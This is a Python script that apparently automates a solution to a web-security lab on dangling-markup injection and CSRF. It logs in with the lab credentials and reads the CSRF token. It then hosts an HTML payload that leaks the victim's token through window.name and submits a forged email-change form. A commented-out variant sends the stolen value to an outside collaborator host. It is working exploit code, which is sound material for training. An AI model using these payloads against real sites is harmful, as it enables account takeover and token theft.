import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
#collab_url = sys.argv[2]
login_url = burp_url + '/login'

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0'})

response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)


response = session.get(login_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf_token = match.group(1)
burp_data = {"csrf": csrf_token,"username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)



#burp_data = {    "urlIsHttps": "on",    "responseFile": "/exploit",    "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",    "responseBody": (        "<script>\r\n"        "if(window.name) {\r\n"        f"\t\tnew Image().src='//{collab_url}?'+encodeURIComponent(window.name);\r\n"        "\t\t} else {\r\n"        f"     \t\t\tlocation = '{burp_url}/my-account?email=%22%3E%3Ca%20href=%22{exploit_server}/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';\r\n"        "}\r\n"        "</script>"    ),    "formAction": "STORE"}
burp_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"<html>\r\n    <head>\r\n    </head>\r\n    <body>\r\n        <form name=\"csrfform\" method=\"post\" action=\"{burp_url}/my-account/change-email\">\r\n            <input type=\"hidden\" id=\"csrf\" name=\"csrf\" value=\"\" />\r\n            <input type=\"hidden\" name=\"email\" value=\"hacker@evil-user.net\" />\r\n        </form>\r\n        <script>\r\n            if(window.name) {{\r\n                var CSRFToken = window.name.slice(80,112);\r\n\r\n                document.getElementById('csrf').value = CSRFToken;\r\n                document.forms['csrfform'].submit();\r\n            \r\n            }} else {{\r\n                window.location.replace('{burp_url}/my-account?email=%22%3E%3Ca%20href=%22{exploit_server}/exploit%22%3EClick%20me%20to%20update%20email%3C/a%3E%3Cbase%20target=%27');\r\n            }}\r\n        </script>\r\n    </body>\r\n</html>", "formAction": "STORE"}
#session.post(burp0_url, headers=burp0_headers, data=burp0_data)

session.post(exploit_server, data=burp_data)
session.get(burp_url + '/deliver-to-victim')


print("powinno dzialac, ale bot sie zepsul")

#print("It is impossible to automate tasks that require a collabulator")
#collab_input = input("Paste here a value from collabolator: ")
#match = re.search(r'[0-9a-zA-Z]{32}',collab_input)
#csrf_from_attack = match.group(0)
#print(csrf_from_attack)

#burp_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"<html>\r\n  <body>\r\n    <form action=\"{burp_url}/my-account/change-email\" method=\"POST\">\r\n      <input type=\"hidden\" name=\"email\" value=\"hacker&#64;evil-user&#46;ne\" />\r\n      <input type=\"hidden\" name=\"csrf\" value=\"{csrf_from_attack}\" />\r\n      <input type=\"submit\" value=\"Submit request\" />\r\n    </form>\r\n    <script>\r\n      history.pushState('', '', '/');\r\n      document.forms[0].submit();\r\n    </script>\r\n  </body>\r\n</html>\r\n", "formAction": "STORE"}
#session.post(exploit_server, data=burp_data)
#session.get(burp_url + '/deliver-to-victim')
